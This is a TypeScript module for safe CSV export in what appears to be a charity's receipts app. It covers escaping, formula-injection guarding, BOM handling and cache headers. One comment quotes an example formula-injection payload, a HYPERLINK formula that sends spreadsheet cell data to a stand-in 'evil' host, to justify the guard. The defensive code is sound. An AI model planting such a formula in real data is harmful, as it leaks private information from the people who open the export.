// ============================================================
//  csv.ts — one place that knows how to write a CSV safely.
//
//  Three routes were building CSVs by hand and two of them got the
//  escaping wrong, so this is a security control rather than a
//  tidy-up. Keeping it a pure module also means the vitest suite
//  can exercise it, which it could not while it lived as a private
//  helper inside a route handler.
// ============================================================

/**
 * Neutralise spreadsheet formula injection.
 *
 * Families control receipt descriptions, photo captions and their own names.
 * A value beginning =, +, - or @ is evaluated as a FORMULA by Excel and Sheets
 * when the export is opened, so a description of
 * `=HYPERLINK("https://evil/?"&A1,"receipt")` runs inside the charity's finance
 * spreadsheet. Quoting alone does not help — the spreadsheet strips the quotes
 * before evaluating. Tab and CR are included because both can be used to shift
 * a value into a formula position.
 */
export function deFormula(s: string): string {
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/** Escape one cell: formula-guard, then quote if it contains a delimiter. */
export function csvField(v: any): string {
  if (v === null || v === undefined) return "";
  const s = deFormula(String(v));
  // \r matters as much as \n: a lone CR is a row break to some parsers.
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function csvRow(arr: any[]): string {
  return arr.map(csvField).join(",") + "\n";
}

export function toCsv(headers: string[], rows: any[][]): string {
  let out = csvRow(headers);
  for (const r of rows) out += csvRow(r);
  return out;
}

/**
 * Prepend a UTF-8 byte-order mark.
 *
 * Excel on Windows reads a BOM-less UTF-8 CSV as the legacy system codepage,
 * so accented names come out mangled. This is a Canadian charity — accented
 * names are certain, not hypothetical — and Excel is the tool the audience
 * actually owns.
 */
export function csvBody(csv: string): string {
  return "﻿" + csv;
}

/**
 * `<slug>-<base>[-<year>].csv`
 *
 * The tenant slug matters: without it every charity's file is `receipts.csv`,
 * and a support session across two tenants leaves `receipts.csv` and
 * `receipts (1).csv` in Downloads with no way to tell them apart — in exactly
 * the situation where confusing two charities' data matters most.
 */
export function exportFilename(slug: string, base: string, year?: number | null): string {
  const safeSlug = (slug || "export").replace(/[^a-zA-Z0-9_-]/g, "") || "export";
  return `${safeSlug}-${base}${year ? `-${year}` : ""}.csv`;
}

/** Response headers for a CSV download. */
export function csvHeaders(filename: string): Record<string, string> {
  return {
    "Content-Type": "text/csv; charset=utf-8",
    "Content-Disposition": `attachment; filename="${filename}"`,
    // These carry home addresses and phone numbers — never let a shared cache
    // hold one. photos.zip already sets this; the CSV routes did not.
    "Cache-Control": "no-store",
  };
}
